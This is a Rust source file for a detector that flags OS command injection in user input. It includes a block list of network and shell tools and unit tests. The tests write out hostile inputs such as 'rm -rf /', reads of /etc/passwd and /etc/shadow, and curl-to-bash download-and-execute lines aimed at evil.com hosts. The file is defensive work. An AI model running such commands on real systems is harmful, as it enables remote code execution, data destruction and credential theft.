use crate::detectors::detector_trait::InputDetector;
use std::collections::HashSet;

/// Detector for OS Command Injection attacks
///
/// Detects attempts to inject malicious shell commands into inputs that
/// may be passed to system shells. Focuses on shell metacharacters and
/// common command injection patterns.
pub struct CommandInjectionDetector {
    suspicious_chars: HashSet<char>,
    suspicious_sequences: Vec<&'static str>,
    dangerous_commands: HashSet<&'static str>,
}

impl CommandInjectionDetector {
    /// Create a new instance of the command injection detector
    pub fn new() -> Self {
        let mut suspicious_chars = HashSet::new();
        for c in [';', '&', '|', '`', '$', '(', ')', '<', '>', '\\', '\'', '"', '!', '*'] {
            suspicious_chars.insert(c);
        }

        let suspicious_sequences = vec![
            "&&", "||", ">>", "<<", "|&", "&>", ">&",
            "$(", "`", "${", ";", "2>", "2>&1", "|",
        ];

        let dangerous_commands = [
            "rm", "chmod", "chown", "mkdir", "mkfifo", "touch", "cat", "nc",
            "ncat", "telnet", "bash", "sh", "ksh", "zsh", "csh", "ping", 
            "wget", "curl", "ftp", "ssh", "kill", "pkill", "nohup", "xterm",
        ].iter().cloned().collect();

        CommandInjectionDetector {
            suspicious_chars,
            suspicious_sequences,
            dangerous_commands,
        }
    }

    /// Checks if the input contains suspicious characters in a pattern that
    /// suggests command injection
    fn contains_suspicious_pattern(&self, input: &str) -> bool {
        let input_lower = input.to_lowercase();
        
        // Count suspicious characters - too many might indicate an attack
        let suspicious_char_count = input.chars()
            .filter(|c| self.suspicious_chars.contains(c))
            .count();
            
        if suspicious_char_count > 2 {
            return true;
        }
        
        // Check for suspicious sequences
        for seq in &self.suspicious_sequences {
            if input.contains(seq) {
                // Special check for the pipe character
                // Ensure that this is not a false positive (like in URLs)
                if *seq == "|" {
                    // Check if it's not part of a URL or similar structure
                    if !input.contains("http://") && !input.contains("https://") {
                        return true;
                    }
                } else {
                    return true;
                }
            }
        }
        
        // Check for dangerous commands combined with metacharacters
        for cmd in &self.dangerous_commands {
            // Command followed by space or special character
            let cmd_pattern = format!("{} ", cmd);
            let with_semicolon = format!("{};", cmd);
            let with_pipe = format!("{}|", cmd);
            let with_and = format!("{}&", cmd);
            
            if input_lower.contains(&cmd_pattern) || 
               input_lower.contains(&with_semicolon) ||
               input_lower.contains(&with_pipe) ||
               input_lower.contains(&with_and) {
                return true;
            }
        }
        
        // Advanced pattern detection
        self.check_advanced_patterns(input)
    }
    
    /// Checks for more complex command injection patterns
    fn check_advanced_patterns(&self, input: &str) -> bool {
        let input_lower = input.to_lowercase();
        
        // Check for command substitution
        if (input.contains('`') && input.matches('`').count() > 1) || 
           (input.contains("$(") && input.contains(")")) {
            return true;
        }
        
        // Check for attempt to bypass simple filters
        if input.contains("'") && input.contains("\"") && 
           (input.contains(";") || input.contains("|") || input.contains("&")) {
            return true;
        }
        
        // Check for hexadecimal or octal encoding often used in bypasses
        if input.contains("\\x") || input.contains("\\0") {
            return true;
        }
        
        // Check for typical shell redirection when used with commands
        if (input.contains(">") || input.contains("<")) && 
           self.dangerous_commands.iter().any(|cmd| input_lower.contains(cmd)) {
            return true;
        }
        
        false
    }
}

impl InputDetector for CommandInjectionDetector {
    fn detect(&self, input: &str) -> bool {
        if input.trim().is_empty() {
            return false;
        }
        
        self.contains_suspicious_pattern(input)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_inputs() {
        let detector = CommandInjectionDetector::new();
        
        // Safe inputs should not be flagged
        assert!(!detector.detect("Hello world"), "Safe text should not be flagged");
        assert!(!detector.detect("John's profile"), "Apostrophe in normal text should not be flagged");
        assert!(!detector.detect("user@example.com"), "Email should not be flagged");
        assert!(!detector.detect("1234567890"), "Numbers should not be flagged");
        assert!(!detector.detect("https://example.com/path?query=value"), "URLs should not be flagged");
    }

    #[test]
    fn test_command_injection_attacks() {
        let detector = CommandInjectionDetector::new();
        
        // Test basic command injection patterns
        assert!(detector.detect("ping 127.0.0.1; rm -rf /"), "Basic command injection should be detected");
        assert!(detector.detect("user@example.com && cat /etc/passwd"), "Command injection with && should be detected");
        assert!(detector.detect("test | cat /etc/shadow"), "Command injection with pipe should be detected");
        assert!(detector.detect("name`ls`"), "Command substitution with backticks should be detected");
        assert!(detector.detect("$(rm -rf ~)"), "Command substitution with $() should be detected");
    }

    #[test]
    fn test_complex_command_injection() {
        let detector = CommandInjectionDetector::new();
        
        // Test more complex injection patterns
        assert!(detector.detect("input' && echo 'pwned"), "SQL-like injection leading to command should be detected");
        assert!(detector.detect("input\"; touch /tmp/hacked; \""), "Escaping quotes for command injection should be detected");
        assert!(detector.detect("input > /dev/null && curl evil.com/script.sh | bash"), "Complex pipe chain should be detected");
        assert!(detector.detect("input && curl -s http://evil.example.com/shell.sh | bash -"), "Download and execute payload should be detected");
    }

    #[test]
    fn test_evasion_techniques() {
        let detector = CommandInjectionDetector::new();
        
        // Test evasion techniques
        assert!(detector.detect("ping 127.0.0.1 && echo \\x65\\x76\\x69\\x6c"), "Hex encoding should be detected");
        assert!(detector.detect("ping$IFS127.0.0.1;cat$IFS/etc/passwd"), "IFS substitution-like pattern should be detected");
        assert!(detector.detect("ping 127.0.0.1 `#comment` ; rm file"), "Comment injection should be detected");
        assert!(detector.detect("ping$((1))127.0.0.1"), "Arithmetic expansion-like pattern should be detected");
    }
} 